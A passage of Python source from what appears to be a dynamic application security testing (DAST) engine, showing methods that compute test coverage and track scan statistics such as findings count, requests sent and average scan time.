        coverage = min(100.0, (total_tests / total_attack_surface) * 100)
        
        return coverage
    
    def _update_statistics(self, scan_result: DASTScanResult):
        """Update engine statistics."""
        
        self.stats['scans_performed'] += 1
        self.stats['vulnerabilities_found'] += len(scan_result.findings)
        self.stats['requests_sent'] += scan_result.requests_sent
        
        # Update average scan time
        if self.stats['scans_performed'] == 1:
            self.stats['average_scan_time'] = scan_result.scan_duration
        else:
            total_scans = self.stats['scans_performed']
            current_avg = self.stats['average_scan_time']
            self.stats['average_scan_time'] = (
                (current_avg * (total_scans - 1) + scan_result.scan_duration) / total_scans
            )
        
        # Update success rate (simplified)
        self.stats['success_rate'] = min(1.0, len(scan_result.findings) / max(1, scan_result.tests_executed))
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get DAST engine statistics."""
        
        return dict(self.stats)
